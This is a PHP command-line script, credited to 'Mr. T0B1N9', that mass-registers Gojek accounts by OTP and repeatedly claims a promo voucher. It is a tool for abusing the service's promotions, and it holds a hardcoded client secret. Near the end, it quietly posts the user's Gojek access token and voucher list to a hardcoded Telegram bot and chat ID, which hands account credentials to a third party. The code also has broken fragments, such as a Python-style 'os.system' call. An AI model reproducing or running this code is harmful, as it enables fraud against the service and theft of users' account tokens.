<?php

date_default_timezone_set('Asia/Jakarta');
include "gomart.php";
ulang:
// function change(){
os.system('clear');
echo color("nevy"," ===================================\n");
echo color("blue","  Auto create Gojek & Redeem voucher	\n");
echo color("green","             Mr. T0B1N9\n");
echo color("blue","  Time    : ".date('[d-m-Y] [H:i:s]')."\n");
echo color("blue","  Format Nomor 08/62 Pake Salah satu \n");
echo color("blue","           Proses regis Dulu   \n");
echo color("nevy"," Time    : ".date('[d-m-Y] [H:i:s]')."	\n");
echo color("purple","
 _____                     ______  _____ _____ 
|_   _|                    | ___ \|  _  |_   _|
  | | ___  __ _ _ __ ___   | |_/ /| | | | | |  
  | |/ _ \/ _` | '_ ` _ \  | ___ \| | | | | |  
  | |  __/ (_| | | | | | | | |_/ /\ \_/ / | |  
  \_/\___|\__,_|_| |_| |_| \____/  \___/  \_/  
                                               
                                               
\n");
echo color("nevy"," ===================================\n");
        $nama = nama();
        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
        echo color("nevy","        Proses menuju register                 \n");
        echo color("purple","Nomor : ");
        // $no = trim(fgets(STDIN));
        $nohp = trim(fgets(STDIN));
        $nohp = str_replace("62","62",$nohp);
        $nohp = str_replace("(","",$nohp);
        $nohp = str_replace(")","",$nohp);
        $nohp = str_replace("-","",$nohp);
        $nohp = str_replace(" ","",$nohp);

        if (!preg_match('/[^+0-9]/', trim($nohp))) {
            if (substr(trim($nohp),0,3)=='62') {
                $hp = trim($nohp);
            }
            else if (substr(trim($nohp),0,1)=='0') {
                $hp = '62'.substr(trim($nohp),1);
        }
         elseif(substr(trim($nohp), 0, 2)=='62'){
            $hp = '6'.substr(trim($nohp), 1);
        }
        else{
            $hp = '1'.substr(trim($nohp),0,13);
        }
    }
        $data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$hp.'","signed_up_country":"ID"}';
        $register = request("/v5/customers", null, $data);
        if(strpos($register, '"otp_token"')){
        $otptoken = getStr('"otp_token":"','"',$register);
        echo color("nevy"," Masukkan OTP..")."\n";
        otp:
        echo color("purple"," Otp : ");
        $otp = trim(fgets(STDIN));
        $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
        $verif = request("/v5/customers/phone/verify", null, $data1);
        if(strpos($verif, '"access_token"')){
        echo color("yellow","BERHASIL REGIST\n");
        $token = getStr('"access_token":"','"',$verif);
        $uuid = getStr('"resource_owner_id":',',',$verif);
        echo color("green","+] Token : ".$token."\n\n");
        save("token.txt",$token); 
}
}
{
echo color("nevy","        Proses menuju Login                  \n");

$ydf = new ydf();
/** 
@ step 1
return @type json contain <otpToken> 
*/
echo color("nevy"," ?] Ulangi Nomor : ");
$phoneNumber = trim(fgets(STDIN));
$getOTPToken = $ydf->loginRequest($phoneNumber);
$json = json_decode($getOTPToken, true);
$OTPToken = $json['data']['otp_token'];
echo color("nevy"," ?] Otp : ");
$otpCode = trim(fgets(STDIN));
echo color("green","  Auto Token ");
echo $OTPToken;
$getAccesstoken = $ydf->getAuthToken($OTPToken, $otpCode);
$json = json_decode($getAccesstoken, true);
$accesstoken = $json['access_token'];
$accesstoken = $json['access_token'];
echo "\n";
}

date_default_timezone_set('Asia/Jakarta');
include_once ('gomart.php');
echo color("purple","                 CLAIM VOUCHER GOJEK                      \n");
$token = $accesstoken;
        {
        echo "\n".color("red"," ▬▬▬▬▬▬▬▬▬▬▬▬CLAIM VOUCHER▬▬▬▬▬▬▬▬▬▬▬▬");
        echo "\n".color("purple"," Note : ");
        echo "\n".color("purple"," Proses claim voc memru melalui 2x otp");
        echo "\n".color("purple"," Jam 09.00 - 10.00 WIB untuk proses Go-Mart");
        echo "\n".color("red"," ▬▬▬▬▬▬▬▬▬▬▬▬CLAIM VOUCHER▬▬▬▬▬▬▬▬▬▬▬▬");
        echo "\n".color("nevy","🔒▶️ 1. Claim GO-Mart V1  . . .");
        echo "\n".color("yellow","⏳▶️ Please wait.... Skip");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(8);
        }
        $code1 = request1('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"YEARENDSALE"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
        echo "\n".color("green","🔓▶️ Message: ".$message);
        goto gocar;
        }else{
        echo "\n".color("red","🔐▶️ Message: ".$message);
          gocar:
        echo "\n".color("nevy","🔒▶️ 2. Claim G-Mart v2  . . .");
        echo "\n".color("yellow","⏳▶️ Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(8);
        }
        $code1 = request2('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"YEARENDSALE"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai.')){
        echo "\n".color("green","🔓▶️ Message: ".$message);
        goto gofood;
        }else{
        echo "\n".color("red","🔐▶️ Message: ".$message);
        gofood:
        echo "\n".color("nevy","🔒▶️ 3. Claim Go-Mart v3 . . .");
        echo "\n".color("yellow","⏳▶️ Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(8);
        }
        $code1 = request3('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"YEARENDSALE"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai.')){
        echo "\n".color("green","🔓▶️ Message: ".$message);
        goto goca;
        }else{
        echo "\n".color("red","🔐▶️ Message: ".$message);
        goca:
        sleep(1);
        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=13&page=1', $token);
        $total = fetch_value($cekvoucher,'"total_vouchers":',',');
		$voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
		$voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
		$voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
		$voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
		$voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
		$voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
		$voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
		$voucher8 = getStr1('"title":"','",',$cekvoucher,"8");
		$voucher9 = getStr1('"title":"','",',$cekvoucher,"9");
		$voucher10 = getStr1('"title":"','",',$cekvoucher,"10");
        echo "\n".color("purple","🎫▶️ Total voucher ".$total." : ");
        echo "\n".color("nevy","                     1. ".$voucher1);
        echo "\n".color("blue","                     2. ".$voucher2);
        echo "\n".color("red","                     3. ".$voucher3);
        echo "\n".color("yellow","                     4. ".$voucher4);
        echo "\n".color("purple","                     5. ".$voucher5);
        echo "\n".color("green","                     6. ".$voucher6);
        echo "\n".color("white","                     7. ".$voucher7);
        echo "\n".color("yellow","                     8. ".$voucher8);
        echo "\n".color("purple","                     9. ".$voucher9);
        echo "\n".color("nevy","                     10. ".$voucher10);
        echo"\n";
         $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
         $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
         $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
         $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
         $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
         $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
         $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
         $expired8 = getStr1('"expiry_date":"','"',$cekvoucher,'8');
         $expired9 = getStr1('"expiry_date":"','"',$cekvoucher,'9');
         $expired10 = getStr1('"expiry_date":"','"',$cekvoucher,'10');
         $TOKEN  = "1098660626:AAHBmKjIM_3fK-tfnWhtxdqfjGHxQvk2b24";
         $chatid = "1127649087";
         $pesan 	= "♤ Gojek Account Info By : Mr. T0B1N9 ♤ \n\n [bung.php] \n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]";
         $method	= "sendMessage";
         $url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
         $post = [
         'chat_id' => $chatid,31
         ];
         $header = [
         "X-Requested-With: XMLHttpRequest",
         "User-Agent: Mozilla/5.0 (X11; Linux x86_64) Chrome/51.0.2704.84" 
         ];
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($ch, CURLOPT_URL, $url);
         curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
         curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         $datas = curl_exec($ch);
         $error = curl_error($ch);
         $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
         curl_close($ch);
         $debug['text'] = $pesan;
         $debug['respon'] = json_decode($datas, true);
 }
 }
 }
 }
 
          


echo "\n".color("purple","SETPIN..!!!: y/n ");
         $pilih1 = trim(fgets(STDIN));
         if($pilih1 == "y" || $pilih1 == "Y"){
         //if($pilih1 == "y" && strpos($no, "628")){
         echo color("nevy","▬▬▬▬▬▬▬▬▬▬▬▬▬▬ PIN MU = 147258 ▬▬▬▬▬▬▬▬▬▬▬▬")."\n";
         $data2 = '{"pin":"147258"}';
         $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
         echo color("purple", "Otp pin: "."\n");
         $otpsetpin = trim(fgets(STDIN));
         $verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
         echo $verifotpsetpin;
         }else if($pilih1 == "n" || $pilih1 == "N"){
         die();
         }else{
         echo color("red","-] GAGAL!!!\n");}      